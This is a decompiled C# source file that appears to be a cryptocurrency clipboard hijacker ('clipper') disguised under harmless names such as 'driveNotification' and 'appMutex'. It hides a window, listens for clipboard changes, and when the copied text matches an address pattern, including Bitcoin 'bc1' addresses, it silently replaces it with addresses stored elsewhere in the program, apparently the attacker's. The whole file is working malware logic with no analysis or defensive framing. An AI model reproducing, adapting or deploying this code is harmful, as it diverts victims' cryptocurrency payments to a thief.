using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).CreateParams;
				createParams.ExStyle |= 0x80;
				return createParams;
			}
		}

		public NotificationForm()
		{
			Program.NativeMethods.SetParent(((Control)this).Handle, Program.NativeMethods.intpreclp);
			Program.NativeMethods.AddClipboardFormatListener(((Control)this).Handle);
		}

		private bool RegexResult(Regex pattern)
		{
			return pattern.Match(currentClipboard).Success;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).Msg == 797)
			{
				currentClipboard = GetText();
				if (currentClipboard.StartsWith("bc1"))
				{
					if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))
					{
						string text = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
						SetText(text);
					}
				}
				else if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex2))
				{
					string text2 = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex2);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string ReturnValue = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				ReturnValue = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return ReturnValue;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
